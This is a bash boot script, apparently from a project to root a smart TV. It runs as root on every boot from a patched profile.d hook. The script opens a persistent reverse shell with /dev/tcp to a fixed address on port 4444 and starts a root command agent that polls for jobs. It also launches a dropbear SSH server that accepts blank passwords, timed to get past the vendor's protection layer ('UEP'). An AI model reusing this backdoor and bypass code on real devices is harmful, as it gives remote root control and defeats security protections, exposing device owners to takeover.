#!/bin/bash
# tvroot boot entry - runs as root on every boot from the patched profile.d
# script, by CONTENT (UEP-safe). Persistent dial-back + debloat.
LOG=/opt/usr/share/tvroot/debloat.log
DIR=/opt/usr/share/tvroot
[ -e /run/.tvroot-debloat ] && exit 0
: > /run/.tvroot-debloat 2>/dev/null
mkdir -p "$DIR" 2>/dev/null
{
  up=$(read up rest < /proc/uptime 2>/dev/null; echo "$up")
  echo "=== tvroot boot entry uptime=${up}s uid=$(id -u 2>/dev/null)"
  # persistent dial-back (signed /bin/bash, no UEP involvement)
  ( exec 9<>/dev/tcp/10.0.75.53/4444; /bin/bash -i <&9 >&9 2>&9 ) &
  if [ -f "$DIR/debloat.sh" ]; then
    /bin/bash -c "$(cat "$DIR/debloat.sh")"
  else
    echo "=== debloat.sh missing"
  fi
  # root command agent: polls cmd/in as root, runs jobs by content (UEP-safe),
  # output in cmd/out. Kill switch: touch cmd/disabled.
  AG="$DIR/agent.sh"
  if [ -f "$AG" ]; then
    if [ -e /run/tvroot-agent.pid ] && kill -0 "$(cat /run/tvroot-agent.pid)" 2>/dev/null; then
      echo "=== root agent already running (pid $(cat /run/tvroot-agent.pid))"
    else
      setsid /bin/bash -c "$(cat "$AG")" </dev/null >/dev/null 2>&1 &
      sleep 1
      echo "=== root agent started (pid $(cat /run/tvroot-agent.pid 2>/dev/null))"
    fi
  else
    echo "=== root agent not installed"
  fi
  echo "=== tvroot boot entry done"
} >> "$LOG" 2>&1
:
# start dropbear sshd — the UEP gate patch lands ~60s into stick boots, so
# retry through the patch window (setsid-detached, survives the hook SIGHUP;
# idles while dropbear is up and restarts it if it dies). On stickless boots
# UEP stays up and the loop gives up quietly after ~3 minutes.
setsid /bin/sh -c '
i=0
while [ $i -lt 36 ]; do
  grep -q ":0016 .* 0A " /proc/net/tcp && exit 0
  [ -f /opt/etc/dropbear/dropbear_host_ed25519 ] || \
    /opt/bin/dropbearmulti dropbearkey -t ed25519 -f /opt/etc/dropbear/dropbear_host_ed25519 2>/dev/null
  ( /opt/bin/dropbearmulti dropbear -p 22 -R -B -F -r /opt/etc/dropbear/dropbear_host_ed25519 )
  i=$((i+1)); sleep 5
done
' </dev/null >>/opt/usr/share/tvroot/dropbear.log 2>&1 &
